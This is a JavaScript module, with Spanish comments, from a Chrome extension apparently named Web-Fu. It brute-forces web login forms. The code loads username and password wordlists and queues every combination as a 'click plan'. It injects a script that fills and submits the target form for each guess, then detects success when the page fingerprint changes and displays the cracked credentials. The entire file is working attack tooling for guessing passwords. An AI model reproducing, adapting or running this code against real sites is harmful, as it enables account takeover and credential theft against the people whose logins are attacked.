/*
    Web-Fu
    sha0()badchecksum.net

    menu -> frmBrute -> clicker

    TODO: poder cancelar ataque
    TODO: hidden inputs ??
    TODO: si el login failed es otra url, como volvemos?


    problemas:
        que la url cambie pero sea el mismo form

*/

(function() {

    frmBrute = {
        running: false,
        clicker: false,
        id: 0,                  // número de intento de login
        url: '',
        startTime: 0,
        endTime: 0,
        comm: {},               // communications
        fp: {},                 // fingerprint
        cp: [],                 // Click Plan
        pcp: [],                // Previous Click Plan
        lockCracked: false
    };

    frmBrute.comm.init = function() {
        chrome.extension.onMessage.addListener(frmBrute.comm.handle);
    };

    frmBrute.comm.handle = function(msg,sender,send) {
        if (!frmBrute.running)
            return;

        switch (msg.method) {   //TODO: pasar esto a comm.js ??

            /*
            case 'clickerReloaded':
                console.log('clicker reloaded');
                frmBrute.refreshForm = true;
                frmBrute.comm.send = send;
                send({method:'clickerDoRefresh'});
                break;*/

            case 'clickerReady':
                if (frmBrute.fingerprint(msg.fp))
                    return;

                console.log('clickerReady');
                
                frmBrute.comm.send = send;
                frmBrute.walk();
                break;

            /*case 'clickerRefresh':
                frmBrute.clicker = false;
                frmBrute.comm.enableClicker();
                break;*/

            
            case 'clickerCracked':
                frmBrute.cracked();
                break;
        }

    };

    frmBrute.comm.enableClicker = function() {
        /*
            Inyecta un script que espera hasta que clicker esté cargado en memória, 
            cuando esto suceda, lo activa para que nos envie su handler de comunicaciones 
            y poder así enviarle palabras desde clicker.walk()
        */
        console.log('enaling clicker');
        var code = '';
        code += 'function tryEnableClicker() {';
        code += '   console.log("tryEnableClicker()");';
        code += '   if (typeof(clicker) == "undefined")';
        code += '       setTimeout(tryEnableClicker, 100);';
        code += '   else';
        code += '       clicker.enable();';
        code += '}';
        code += 'tryEnableClicker();';
        chrome.tabs.executeScript(null, {code: code});
    };

    frmBrute.fingerprint = function(fp) {

        if (!frmBrute.fp.url) {

            // init fingerprint
            frmBrute.fp = fp;
            console.log('init fingerprint');

        } else {

            // check fingerprint
            if (frmBrute.fp.lines < fp.lines-4 || frmBrute.fp.lines > fp.lines+4 || frmBrute.fp.url != fp.url) {
                frmBrute.cracked();
                return true;
            }
        }
        
        return false;
    };

    frmBrute.start = function() {
        frmBrute.clicker = false;
        frmBrute.lockCracked = false;
        frmBrute.running = true;
        frmBrute.id = 0;
        frmBrute.fp = {};
        var ap = attackPlan.getDB();
        frmBrute.url = ap.url;
        attackPlan = new AttackPlan();
        if (!ap.vector)
            ap.vector = ap.targets[0].form;

        frmBrute.debugAP(ap);
        comm.loadWordlists(ap);
        comm.setSettings(ap);
        frmBrute.buffering(ap);
        delete ap;

        frmBrute.startTime = new Date().getTime();
        comm.log.start('Form Crack');
        frmBrute.comm.enableClicker();
    };

    frmBrute.clearBuffer = function() {
        frmBrute.cp = [];
        frmBrute.sz = 0;
    };

    frmBrute.buffering = function(ap) {  //todo delete de .words, recorrido inverso
        frmBrute.clearBuffer();
        if (ap.targets.length>1) {
            for (var i=ap.targets[0].words.length-1; i>=0; --i) {
                for (var j=ap.targets[1].words.length-1; j>=0; --j) {
                    frmBrute.cp.push({
                        method: 'autoclick',
                        form: ap.targets[0].form,
                        id: -1,
                        vector: ap.vector,
                        targets: [
                            {
                                id: ap.targets[0].field,
                                value: ap.targets[0].words[i]
                            },{
                                id: ap.targets[1].field,
                                value: ap.targets[1].words[j]
                            }
                        ]
                    });
                }
            }

        } else {

            for (var i=ap.targets[0].words.length-1; i>=0; --i) {
                frmBrute.cp.push({
                    method: 'autoclick',
                    form: ap.targets[0].form,
                    id: -1,
                    vector: ap.vector,
                    targets: [
                        {
                            id: ap.targets[0].field,
                            value: ap.targets[0].words[i]
                        }
                    ]
                });
            }
        }
        frmBrute.sz = frmBrute.cp.length;
    };


    frmBrute.walk = function() {
        if (frmBrute.cp.length == 0)
            return frmBrute.finish();

        if (!frmBrute.lockCracked) {
            frmBrute.pcp = frmBrute.cp.pop()
            frmBrute.pcp.id = frmBrute.id++;
            console.dir(frmBrute.pcp);
            frmBrute.comm.send(frmBrute.pcp);
        }
    };

    frmBrute.debugAP = function(ap) {
        for (var i=0; i<ap.targets.length; i++) {
            console.log('target['+i+'] -> form: '+ap.targets[i].form);
            console.log('target['+i+'] -> field:'+ap.targets[i].field);
            console.log('target['+i+'] -> value:'+ap.targets[i].value);
        }
        console.log('attack vector: '+ap.vector);
    };

    frmBrute.finish = function() {
        frmBrute.running = false;
        frmBrute.clicker = false;
        frmBrute.endTime = new Date().getTime();
        var secs = (frmBrute.endTime-frmBrute.startTime)/1000;
        var wps = frmBrute.sz/secs;
        comm.log.finish('Form Crack '+wps+' wps');
        frmBrute.clearBuffer();
    };

    frmBrute.cracked = function() {
        frmBrute.lockCracked = true;
        frmBrute.running = false; 
        var cp = frmBrute.pcp;

        console.log('clickerCracked');
        frmBrute.finish(); // se recibe un click plan.
        
        if (cp.targets.length == 1)
            display('Form Cracked!!','word:'+cp.targets[0].value);
        else if (cp.targets.length == 2)
            display('Form Cracked!!', 'user: '+cp.targets[0].value+' pass: '+cp.targets[1].value);
    };


    frmBrute.comm.init();

})();

